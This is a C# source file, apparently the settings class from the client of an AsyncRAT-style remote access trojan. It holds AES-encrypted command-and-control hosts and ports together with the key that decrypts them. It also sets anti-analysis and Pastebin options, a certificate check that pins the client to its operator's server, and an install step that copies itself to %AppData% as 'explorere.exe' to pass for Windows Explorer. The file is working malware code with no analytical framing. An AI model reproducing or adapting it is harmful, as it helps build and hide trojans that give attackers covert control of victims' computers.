using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Ports = "rTnV5tZHCIeR708rDpuzC7Zdgl2M6D9hpqpmigy88trJtMyMSoX8GXHNRzochouFvLPZbxldCDf25hiWojXUPA==";

	public static string Hosts = "1eUlksBy/WGnNAUXWVRdDqCjUgKbbaA031Tx0CIfC5YMwz5vf6o0shuLKXNBl+vC0exxc1O/sgDFcJlC+Ph/PBrHgL/+T1MTQscU2iDdkV7i95Qq9HNQGjoy/C6KkNBE";

	public static string Version = "XAJfo/5eMLn58hpLWHibh8ZvyKl5nBGbdZFT0ItJg90Xh6A9kBZ4APgfyACtb9zz++nC8pe8ZLMZNi8F5+jZMA==";

	public static string Install = "mLiRZbRe+O3/Fu9X14TiDXcsyp7iKjuivTECELgGYEDBc0xpnqxa1TiAtJSXs22JH0PlU74pmOGoJg1lHysEnA==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "explorere.exe";

	public static string Key = "ejFzQldreTdvUDd2TGhiUXRTY29yRUdRM1o4a3pLcno=";

	public static string MTX = "oo9WfyBqQHTpQk7+aEu8EDj9DnuWq9UizAO6Y+8zlqTp7ust2ZkGmI7su0kf7NBrtyhyhmMCfABmJ/PPaZJ3V5A8AdAhRSJjbXUC6yuXis0=";

	public static string Certificate = "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";

	public static string Serversignature = "9krbqXyOQacpbzKu5ExTdLQz6tDM+brUbHiqXL6UsmMEjedixyiHFkKdIcoAhi0ID88pWUERNsg0OnKixKES/gLeIITn/FgtniLy1zg0yJGbI1ggXNRRKjayLFQ7hJhaY6iSXaMyRiMyIQAcLZgfm6o8lw7qWjLQWZgdDyUzOGCcKoJgVcCqM9+JlVsgOZXsghlU6jBhtlPPhiqMfu9PEDWp69mj3ldfzHicNZ5rh1UJQgfJLMcP5x/tUInIjS/+NP0MIe6AXB4xivn5IQ7YlFF3npakhE4AjE4DnU8hK5VBpP3ch4NPaPXsotw+3gMjBvu5lbkHjsYQKq9JFyPOSUT0DHey8rY3TprLupNNuWdH+OhKBECtOcbNfR69QHVDLQPt2QmNYqjaEfvBoqpjeF0PqprljXCJZ+ctueSYkFW4u/yvRDHq5v4m6jAepr3qSHUgh/jwn6Y8saVLJMu39uP0QNJAPYtmUC6tPCukri9yI1RZ8mUKAQJ8/5HF/jLw9q91sHRiB8I1aHmxdWXXzGThp2sCE6PzBHhLKufIc4Q1WBW5QZb3eTjax/41OsGCJcfWPWtLc0GXnjmZ9Cqz6+Eb8htOi8fTaaR2SzoroKHeEFdmpi2CsNxdNRTy/khqbpD/oYw0IpUkuJwGrORFfRfTE3cb/VhTKZ53GOn6holtfsZ/N8EpecSpxAgbL3lpo09jKDp4F0ucTO/fESh3YVShMuzfTz/UXPlpZqGyvGEsYwYIsvXdDV9N8orx0iH2Oi1Nl1Q968WinNdt4rj4zwjwQrWSHWZWZwr7CJ/4NZ3HnjV594a2ZhvNjmqDV6Pr7THisvPH31MunjKOthvtV7bVnwsoRq7ggMf1vTKfPjnkslz/e7ESLRjUmo3Tx3bYdVsXNuwSKX4Kr0lssspymMUUgJNhbb51LMlmkuM8PUt3uorJi02eylwNNemAK2yhuNo8eB39fCUUVKPUTUREHg==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "AR5uXei6YjTurOpwBnDsDWRVGcBMYlwUuPRkOjsNU+XXmxXOsh2BdNgE25j84lIcok+njb/nU7L1myyuvrSWrA==";

	public static Aes256 aes256;

	public static string Pastebin = "QJ1KNGfF4MBYmWo3ZN4Q0v6lfZDudzzoDFbdszc566ICA0eDXr37N4U51R6G6A2MJR5/GXuPxvYtypamDeRQAQ==";

	public static string BDOS = "gGGpYX4VE08fAgtI+eGvfahm1NRupp4Mpu3JWgm1cwPfWs4asIQp3I3rE14KbnOOpv6E2FIU+Z/Nox9VU2zwYA==";

	public static string Hwid = null;

	public static string Delay = "6";

	public static string Group = "CtExBffNeZfJlSu2snEM5n0znMP4uNQHsmPOWWelSEeZ7uSSFFIDwSa1ZQ+XhMgQfKt29sIN7DyJE77OHem2vA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
